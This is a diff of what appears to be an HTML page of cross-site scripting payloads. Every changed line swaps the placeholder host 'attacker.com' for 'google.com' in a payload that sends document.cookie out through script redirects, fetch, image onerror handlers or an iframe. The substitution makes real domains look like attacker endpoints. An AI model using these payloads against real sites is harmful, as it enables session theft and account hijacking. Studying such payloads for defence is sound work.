@@ -77,14 +77,14 @@
         Steal cookies
       </div>
       <pre><code>
-&lt;script&gt;document.location='http://attacker.com/steal.php?cookie='+document.cookie&lt;/script&gt;
+&lt;script&gt;document.location='http://google.com/steal.php?cookie='+document.cookie&lt;/script&gt;
       </code></pre>
       
       <div class="payload-description">
         Load external content
       </div>
       <pre><code>
-&lt;iframe src="http://attacker.com/malicious.html"&gt;&lt;/iframe&gt;
+&lt;iframe src="http://google.com/malicious.html"&gt;&lt;/iframe&gt;
       </code></pre>
       
       <div class="payload-description">
@@ -140,7 +140,7 @@
         Log data to attacker's server
       </div>
       <pre><code>
-&lt;img src="x" onerror="document.location='http://attacker.com/log.php?data='+document.cookie"&gt;
+&lt;img src="x" onerror="document.location='http://google.com/log.php?data='+document.cookie"&gt;
       </code></pre>
     </div>
     
@@ -151,7 +151,7 @@
         Fetch and steal cookies
       </div>
       <pre><code>
-&lt;script&gt;fetch('http://attacker.com/steal.php?cookie='+document.cookie)&lt;/script&gt;
+&lt;script&gt;fetch('http://google.com/steal.php?cookie='+document.cookie)&lt;/script&gt;
       </code></pre>
       
       <div class="payload-description">
@@ -186,7 +186,7 @@
         Log data to attacker's server
       </div>
       <pre><code>
-&lt;script&gt;document.location='http://attacker.com/log.php?data='+document.cookie&lt;/script&gt;
+&lt;script&gt;document.location='http://google.com/log.php?data='+document.cookie&lt;/script&gt;
       </code></pre>
       
       <div class="payload-description">
@@ -214,7 +214,7 @@
         Load attacker's content
       </div>
       <pre><code>
-&lt;img src=1 onerror=this.src='//attacker.com/pwned?c='+document.cookie&gt;
+&lt;img src=1 onerror=this.src='//google.com/pwned?c='+document.cookie&gt;
       </code></pre>
       
       <div class="payload-description">
